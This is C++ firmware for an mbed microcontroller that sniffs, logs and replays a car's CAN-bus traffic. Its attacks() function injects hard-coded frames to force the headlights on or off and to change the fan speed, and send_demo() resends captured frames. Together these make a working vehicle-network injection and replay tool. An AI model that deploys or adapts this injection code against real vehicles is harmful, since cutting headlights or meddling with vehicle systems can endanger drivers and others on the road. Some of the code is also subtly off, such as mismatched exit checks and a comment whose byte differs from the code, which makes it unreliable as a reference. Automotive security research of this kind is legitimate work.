/*

mbed Can-Bus demo

This program is to demonstrate the CAN-bus capability of the mbed module.

http://www.skpang.co.uk/catalog/product_info.php?products_id=741

v1.0 July 2010

********************************************************************************

WARNING: Use at your own risk, sadly this software comes with no guarantees.
This software is provided 'free' and in good faith, but the author does not
accept liability for any damage arising from its use.

********************************************************************************


*/

#include "mbed.h"
#include "ecu_reader.h"
#include "globals.h"
#include "TextLCD.h"
#include "GPS.h"
#include "SDFileSystem.h"
#define CANDUMP_PATH "/sd/CANdump.txt"

GPS gps(p28, p27);
TextLCD lcd(p18, p19, p20, p17, p16, p15, p14); // rs, rw, e, d0, d1, d2, d3
SDFileSystem sd(p5, p6, p7, p13, "sd");

DigitalIn click(p21);   // Joystick inputs
DigitalIn right(p22);
DigitalIn down(p23);
DigitalIn left(p24);
DigitalIn up(p25);
Serial pc(USBTX, USBRX);


ecu_reader obdii(CANSPEED_500);     //Create object and set CAN speed
void gps_demo(void);
void sd_demo(void);
void send_demo(void);
void attempt_engine(void);
void attacks(void);
Timer timer;


int main() {
    pc.baud(115200);
    //char buffer[20];
    
    //Enable Pullup 
    click.mode(PullUp);
    right.mode(PullUp);
    down.mode(PullUp);
    left.mode(PullUp);
    up.mode(PullUp);
    
    printf("ECU Reader \n"); 
    lcd.locate(0,0);                // Set LCD cursor position
    lcd.printf("CAN-Bus demo");
    
    lcd.locate(0,1);
    lcd.printf("Updated");
       
    pc.printf("\n\rCAN-bus demo...");
    
    wait(3);
    lcd.cls();
    lcd.printf("Use joystick");

    lcd.locate(0,1);
    lcd.printf("U-CAN:D-REQ:L-SD");
    
    pc.printf("\nU-CAN:D-REQ:L-SD");

    while(1)    // Wait until option is selected by the joystick
    {
   
        if(down == 0) attacks();
        if(left == 0) sd_demo();
        if(right == 0) send_demo();
        if(up == 0) break;
        
    }
	FILE *fp = fopen(CANDUMP_PATH, "a");
    lcd.cls();
	lcd.locate(0,0);
    lcd.printf("Dumping CAN...");
    lcd.locate(0,1);
    lcd.printf("press joystick");
    timer.start();
    while(fp != NULL) {  // Main CAN loop
        led2 = 1;
        wait(0.1);
        led2 = 0;
        wait(0.1);
        obdii.dump(fp);
        if(click == 0) break;
        lcd.locate(0,0);
        lcd.printf("timer: %f", timer.read());
    }
    if(fp  == NULL)
    {
		lcd.cls();
		lcd.locate(0,0);
		lcd.printf("File pointer issue");
	}
	fclose(fp);
	lcd.cls();
	lcd.locate(0,0);
	lcd.printf("safe to remove");
	lcd.locate(0,1);
	lcd.printf("SD card. ");
}

void attacks(void){
	lcd.printf("Test attacks to run\n");
	pc.printf("\n up/down for headlights, left/right for fan");
	wait(1);
	while(1)
		{
			
			lcd.locate(0,0);
			if(down == 0){
				//Force headlights off
				while(1){
					//char* message = (char*)"80 00 00 00 00 00 00 00";
					char message[8] = {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x3BB, message))
						lcd.printf("Force headlights off");
					else{
						lcd.printf("Can't send message FHOf");
						break;
					}
					wait(0.1);
					if(down == 0)
						break;
				}
			}
			if(right == 0){
				//Set fan to max
				while(1){
					//char* message = (char*)"00 00 00 1C 00 00 00 00";
					char message[8] = {0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x356, message))
						lcd.printf("Fan to max");
					else{
						lcd.printf("Can't send message fan max");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(left == 0){
				//Set fan to min
				while(1){
					//char* message = (char*)"00 00 00 04 00 00 00 00";
					char message[8] = {0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x356, message))
						lcd.printf("Fan to min");
					else{
						lcd.printf("Can't send message fan min");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}				
			if(up == 0){
				//Force headlights on
				while(1){
					//char* message = (char*)"20 00 00 00 00 00 00 00";
					char message[8] = {0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(obdii.send(0x3BB, message))
						lcd.printf("Force headlights on");
					else{
						lcd.printf("Can't send message FHO");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(click == 0)
				break;
			}
}

void gps_demo(void)
{
    lcd.cls();
    lcd.printf("GPS demo");
    lcd.locate(0,1);
    lcd.printf("Waiting for lock");
 
    wait(3);    
    lcd.cls();
   
    while(1)
    {
      if(gps.sample()) {
         lcd.cls();
        lcd.printf("Long:%f", gps.longitude);
           lcd.locate(0,1);
        lcd.printf("Lat:%f", gps.latitude);
            pc.printf("I'm at %f, %f\n", gps.longitude, gps.latitude);
        } else {
            pc.printf("Oh Dear! No lock :(\n");
            lcd.cls();
            lcd.printf("Waiting for lock");
   
        }
    }
 
}

void sd_demo(void)
{
    lcd.cls();
     printf("\nSD demo");
    lcd.printf("SD demo");
    wait(2);      
    lcd.cls();
    
    FILE *fp = fopen("/sd/sdtest2.txt", "w");
    if(fp == NULL) {
        lcd.cls();
        lcd.printf("Could not open file for write\n");
         pc.printf("\nCould not open file for write");
    }
    fprintf(fp, "Hello fun SD Card World! testing 1234");
    fclose(fp); 
    lcd.locate(0,1);
    lcd.printf("Writtern to SD card");
    pc.printf("\nWrittern to SD card");
        
    while(1)
    {
        led2 = 1;
        wait(0.1);
        led2 = 0;
        wait(0.1);
   
    }
 
}

void send_demo()
{
	char line[80];
	CANMessage myMessage;
	FILE * storedMsgs = fopen(CANDUMP_PATH, "r");
	if(storedMsgs == NULL)
	{
		lcd.cls();
		lcd.locate(0,0);
		lcd.printf("Error opening");
		lcd.locate(0,1);
		lcd.printf("CAN file, exiting");
		
	}
	while(1)
	{
		if(!fgets(&line[0],80,storedMsgs))
		{
			lcd.locate(0,0);
			lcd.printf("End of file");
			return;
		}
		unsigned int id;
		char can_msg[8];
		memset(can_msg,0, 8);
		lcd.locate(0,0);
		lcd.printf("%s", line);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat" //we need this to be unsigned, but char is signed. so we disable the warning only for this line
		sscanf(line, "%*f\t\t%x\t %2hx %2hx %2hx %2hx %2hx %2hx %2hx %2hx\n",&id,&can_msg[0],
			&can_msg[1],&can_msg[2],&can_msg[3],
			&can_msg[4],&can_msg[5],&can_msg[6],
			&can_msg[7]);
#pragma GCC diagnostic pop //restore previous warning state
		lcd.locate(0,0);
		lcd.printf("%02x\t %02x %02x %02x", id, can_msg[0], can_msg[1], can_msg[2]);
		lcd.locate(0,1);
		lcd.printf("%02x %02x %02x %02x %02x", can_msg[3], can_msg[4], can_msg[5], can_msg[6], can_msg[7]); 
				
		while(1)
		{
			//can't move back up the list yet. 
			/*if(up == 0)
			{
				break;
			}*/
			if(down == 0)
			{
				wait(0.2);
				break;
			}
			if(left == 0)
			{
				return;
			}
			if(click == 0)
			{
				
				//send the message
				for(int i = 0; i < 10; i++)
				{
					obdii.send(id, can_msg);
				}
			}
		}
	}
	//now do things. 
}

void attempt_engine()
{
	while(1)
	{
		obdii.request();
		wait(0.1);
	}
}
